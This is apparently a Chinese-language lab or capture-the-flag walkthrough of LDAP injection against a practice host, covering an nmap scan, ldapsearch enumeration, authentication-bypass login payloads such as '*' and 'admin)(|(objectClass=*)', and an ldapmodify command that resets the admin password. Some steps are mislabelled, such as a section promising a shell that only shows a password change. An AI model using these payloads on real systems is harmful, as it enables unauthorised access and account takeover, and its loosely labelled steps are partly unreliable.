# LDAP

### **🔍 1. 發現點**

1.  **使用 Nmap 掃描目標，尋找開放服務**

    ```bash
    nmap -p- -sC -sV --open --min-rate=1000 10.129.204.229
    ```

    * 發現：
      * **Port 80**（HTTP 伺服器）
      * **Port 389**（LDAP 伺服器）
    * 這表明 Web 應用程式可能使用 **LDAP 進行身份驗證**
2.  **使用 `ldapsearch` 探索 LDAP 服務**

    ```bash
    ldapsearch -H ldap://10.129.204.229:389 -D "cn=admin,dc=example,dc=com" -w secret123 -b "ou=people,dc=example,dc=com" "(objectClass=*)"
    ```

    * 嘗試列舉 LDAP 目錄資訊

***

### **🚀 2. 測試Payload**

1. **嘗試使用通配符 `*` 登入**
   * **目標**：測試 Web 應用是否存在 LDAP Injection
   *   在 **使用者名稱** 與 **密碼** 欄位輸入：

       ```
       Username: *
       Password: *
       ```
   * **預期結果**：如果 LDAP 查詢未經過濾，則可繞過身份驗證並直接登入
2. **分析 LDAP Injection 影響**
   *   原始 LDAP 查詢：

       ```php
       (&(objectClass=user)(sAMAccountName=$username)(userPassword=$password))
       ```
   *   **注入 `*` 會讓查詢變為：**

       ```php
       (&(objectClass=user)(sAMAccountName=*)(userPassword=*))
       ```
   * 這將匹配**所有用戶**，直接繞過驗證

***

### **🎯 3. 利用 LDAP Injection**

1. **嘗試提取更多使用者資訊**
   *   在登入頁面測試：

       ```
       Username: (|(uid=*)(userPassword=*))
       Password: anything
       ```
   * **結果**：列出所有使用者
2. **試圖獲取管理員權限**
   *   如果應用程式允許修改 LDAP 查詢，可以使用：

       ```
       Username: admin)(|(objectClass=*)
       Password: anything
       ```
   * **影響**：
     * 可登入任何帳戶（管理員帳戶）
     * 可能竊取敏感資料（例如 **Active Directory** 使用者）

***

### **🔗 4. 橫向移動 & 提權**

1. **使用 LDAP 存取內部服務**
   *   嘗試 **LDAP 傳遞攻擊**

       ```bash
       ldapwhoami -H ldap://10.129.204.229:389 -D "cn=admin,dc=example,dc=com" -w "N0tS3cr3t!"
       ```
   * **成功登入後**，可能存取：
     * **公司內部網路**
     * **Active Directory**
     * **其他關聯服務（如 Web 應用、檔案伺服器）**
2. **嘗試啟動 Shell**
   *   如果應用程式允許執行系統命令：

       ```php
       ldapmodify -H ldap://10.129.204.229:389 -D "cn=admin,dc=example,dc=com" -w secret123 <<EOF
       dn: cn=admin,dc=example,dc=com
       changetype: modify
       add: userPassword
       userPassword: NewPass123!
       EOF
       ```
   * **效果**：
     * 重置 LDAP 管理員密碼
     * 取得完整管理權限

***

### **⚡ 5. 連鎖漏洞**

✅ **LDAP Injection 繞過驗證**\
✅ **列舉所有用戶**\
✅ **獲取管理員存取權限**\
✅ **橫向移動至 Active Directory**\
✅ **提權並執行 Shell 命令**
